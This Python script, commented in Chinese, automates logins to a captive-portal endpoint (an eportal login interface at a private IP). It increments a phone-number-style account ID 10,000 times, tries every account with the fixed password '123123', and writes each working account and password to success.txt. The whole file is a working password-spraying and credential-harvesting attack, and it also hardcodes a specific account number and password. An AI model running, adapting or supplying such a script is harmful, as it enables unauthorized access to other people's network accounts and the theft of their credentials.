import json
import re

import requests
from loguru import logger
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

"""

"""
URL = 'http://172.16.29.11/eportal/InterFace.do'
account = '19862091419'
password = '123123'

data = {
    'userId': '',
    'password': '',
    'service': 'cmcc',
    'queryString': '',
    'operatorPwd': '',
    'operatorUserId': '',
    'validcode': '',
    'passwordEncrypt': 'false',
}

# 创建一个 Session 对象，配置连接池
session = requests.Session()
retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
adapter = HTTPAdapter(max_retries=retries)


def request_post(params, method_data):
    try:
        req = session.post(URL, params=params, data=method_data, verify=False)
        req.encoding = 'utf-8'
        return req.json()
    except Exception as e:
        logger.warning('请求失败', e)
        return False


# 登录请求
def login_request(account_number_params, password_dict_params, method_data):
    # 参数修改
    method_data['userId'] = account_number_params
    method_data['password'] = password_dict_params
    # 请求
    try:
        result = request_post({'method': 'login'}, method_data)
        logger.info(f'请求结果: {result}')
        return result
    except Exception as e:
        logger.warning('请求失败', e)

        return False


def get_query_string():
    """
    获取querystring
    :return:
    """
    try:
        query_string = requests.get('http://172.16.29.11/eportal/redirectortosuccess.jsp', verify=False).text
        pattern = re.compile(r'(?<=index.jsp\?).*?(?=\')')  # 正则匹配
        message = pattern.findall(query_string)[0]  # 正则匹配获得querystring
        return message
    except Exception as e:
        logger.warning(f'出错了,可能当前网络不是Wifi,或者已经登录了')
        logout_request('')
        logger.warning(f'错误:{e}')


def logout_request(userIndex):
    """
    登出请求
    :param userIndex:
    :return:
    """
    try:
        result = request_post(params={'method': 'logout'}, method_data={'userIndex': userIndex})
        if result and result['result'] == 'success':
            logger.info('登出成功')
        return result
    except Exception as e:
        logger.warning('请求失败', e)
        return False


def on_line_equipment_check(userIndex, retry=0):
    """
    在线设备数校验
    :param userIndex:
    :param retry:
    :return:
    """
    try:
        # 请求
        response = request_post(params={'method': 'getOnlineUserInfo'}, method_data={'userIndex': userIndex})

        # 判断是否成功
        if response['result'] == 'success':
            logger.info(f'在线设备数为{json.loads(response["ballInfo"])[2]["value"]}')
            return response
        elif response['result'] == 'wait':
            if retry < 20:
                # 再次请求，递归次数加一，直到超过最大重试次数
                return on_line_equipment_check(userIndex, retry + 1)
            else:
                logger.warning('超过最大重试次数')
    except Exception as e:
        logger.error(f'出现异常: {str(e)}')
    return False


def get_query_string_if_needed(max_retries=3):
    """
        如果data['queryString']为空，则尝试获取querystring，最多重试max_retries次
        :param max_retries: 最大重试次数
        :return: None
        """
    retries = 0
    while retries < max_retries:
        if data['queryString'] == '':
            logger.info('获取querystring')
            query_string = get_query_string()
            if query_string:
                logger.info(f'获取querystring结果{query_string}')
                data['queryString'] = query_string
                break
            else:
                retries += 1
                logger.warning(f'获取querystring失败，尝试次数：{retries}')
        else:
            break
    if retries == max_retries:
        logger.error('达到最大重试次数，未能获取querystring')


def main():
    try:
        get_query_string_if_needed()
        logger.info(f'开始请求，帐户: {account}，密码: {password}')
        login_result = login_request(account, password, data)
        if login_result and login_result['result'] == 'success':
            logger.info('登录成功')
            user_index = login_result['userIndex']
            on_line_equipment_check_result = on_line_equipment_check(user_index)
            if on_line_equipment_check_result:
                with open('success.txt', 'a', encoding='utf-8') as f:
                    f.write(
                        f'"{account}","{password}","{json.loads(on_line_equipment_check_result["ballInfo"])[2]["value"]}"\n')
            logout_request(user_index)
    except Exception as e:
        logger.warning(f'出现异常: {str(e)}')
        exit()


if __name__ == '__main__':

    for i in range(10000):
        logger.info(f'第{i + 1}次尝试===========================================')
        account = str(int(account) + 1)
        main()
